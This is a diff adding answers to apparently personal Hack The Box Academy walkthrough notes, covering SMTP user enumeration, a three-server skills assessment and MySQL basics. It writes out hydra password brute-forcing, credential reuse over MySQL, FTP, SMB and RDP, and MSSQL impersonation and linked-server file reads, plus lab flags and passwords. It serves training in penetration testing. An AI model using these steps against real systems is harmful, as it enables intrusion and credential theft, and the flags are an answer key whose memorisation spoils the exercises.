@@ -2464,32 +2464,171 @@ hr.inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2
 ;; XFR size: 5 records (messages 1, bytes 230)
 ```
 
-Results: HTB{LUIHNFAS2871SJK1259991}
+Results: `HTB{LUIHNFAS2871SJK1259991}`
 
 
 ### SMTP
 
-Question.
+**What is the available username for the domain inlanefreight.htb in the SMTP server?**
 
 ```
-
+smtp-user-enum -M RCPT -U users.list  -D inlanefreight.htb -t $ip
 ```
 
-Results: 
+Results: marlin
+
+**Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.**
+
+```
+hydra -l marlin@inlanefreight.htb -P passwords.list -f $ip pop3
+# It will return the password: poohbear
+
+# Now connect to POP server
+telnet $ip 110
+USER marlin@inlanefreight.htb
+PASS poohbear
+STATS
+LIST
+RETR 1
+```
+
+Results: `HTB{w34k_p4$$w0rd}`
+
 
 
 ### Skills Assessment
 
-Question.
+We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format: - `HTB{...}`. Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.
+
+**EASY. You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.**
+
+```
+sudo nmap -sC -sV -Pn $ip
+echo "$ip    inlanefreight.htb" | sudo tee -a /etc/host
+
+# Download the users.list from HTB or you will go bananas
+smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t $ip 
+# As a result you get fiona@inlanefreight.htb exists
+
+# Password attack
+hydra -l fiona@inlanefreight.htb -P passwords.list -t 64 -f $ip smtp
+# Result: [25][smtp] host: 10.129.179.42   login: fiona@inlanefreight.htb   password: 987654321
+
+# Now we login into the service mysql
+mysql -u fiona -p"987654321" -h $ip
+
+SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
+```
+
+Results: `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`
+
+
+The second server is an internal server (within the `inlanefreight.htb` domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.
+
+**MEDIUM: Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.**
+
+```
+sudo nmap -sC -sV -Pn -p- $ip
+
+ftp $ip 30021
+# Enter as creds anonymous:anonymous
+# dir
+# cd simon
+# mget *.txt
+# quit
+
+ssh simon@$ip
+# Enter password 8Ns8j1b!23hs4921smHzwn
+
+cat flag.txt
+```
+
+Results: HTB{1qay2wsx3EDC4rfv_M3D1UM}
+
+
+
+**Hard. The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.** 
+
+What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)
+
+```
+smbclient -L \\$ip -U simon 
+
+smbclient  \\\\$ip\\Home -U simon -N
+cd IT
+cd Simon
+```
+
+Results: random.txt
+
+Enumerate the target and find a password for the user Fiona. What is her password?
+
+```
+smbclient -L \\$ip -U simon 
+
+smbclient  \\\\$ip\\Home -U simon -N
+cd IT
+cd Fiona
+get creds.txt
+quit
+
+cat creds.txt
+#Try with all creds and see that "48Ns72!bns74@S84NNNSl" works for:
+smbclient  \\\\$ip\\Home -U fiona 
+```
+
+Results: `48Ns72!bns74@S84NNNSl`
+
+
+Once logged in, what other user can we compromise to gain admin privileges?
+
+Results: John
+
+Submit the contents of the flag.txt file on the Administrator Desktop.
+
+```
+rdesktop -u Fiona -p '48Ns72!bns74@S84NNNSl' $ip
+
+# Open Powershell
+sqlcmd
+
+# List databases
+1> SELECT name FROM master.dbo.sysdatabases
+2> go
+# Enumerate DB and nothing interesting comes out
+
+# Verify if our current user has the sysadmin role:
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+go
+#  value 0 indicates no sysadmin role, value 1 is sysadmin role. Fiona has no sysadminrole
+
+
+# Identify Users that we Can Impersonate
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
+go
+
+# As a result we can see john. Let's impersonate him and verify if hjohn has sysadmin role
+EXECUTE AS LOGIN = 'john';  
+SELECT SYSTEM_USER;  
+SELECT IS_SRVROLEMEMBER('sysadmin');  
+go
+
+# No sysadmin role for john
+
+
+# Identify linked Servers in MSSQL
+SELECT srvname, isremote FROM sysservers
+go
+
+# As response we have
+# WINSRV02\SQLEXPRESS                                         # LOCAL.TEST.LINKED.SRV                                                                                                     
+# We can read files from that connection in local
+execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv]; 
 
 ```
 
-```
-
-Results: 
-
-
-
+Results: `HTB{46u$!n9_l!nk3d_$3rv3r$}` 
 
 
 ## [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158)
@@ -2920,6 +3059,60 @@ Results:  HTB{w3b_fuzz1n6_m4573r}
 
 
 ## [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33)
+
+### MySQL
+
+Authenticate to 83.136.255.194:55762 with user "root" and password "password"
+**Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?**
+
+```
+mysql -u root -h $ip -P $port -ppassword
+show databases;
+```
+
+Results: employees
+
+**What is the department number for the 'Development' department?**
+
+```
+mysql -u root -h $ip -P $port -ppassword
+show databases;
+show tables;
+select * from departments;
+```
+
+Results: d005
+
+**What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?**
+
+```
+mysql -u root -h $ip -P $port -ppassword
+show databases;
+show tables;
+select * from employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';
+```
+
+Results: Mitchem
+
+**In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?**
+
+```
+mysql -u root -h $ip -P $port -ppassword
+SELECT * from titles WHERE (emp_no > 10000 OR title NOT LIKE 'Engineer');
+```
+
+Results: 654
+
+### SQL Injections
+
+Question
+
+```
+
+```
+
+Results: 
+
 
 
 ## [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/details/103)
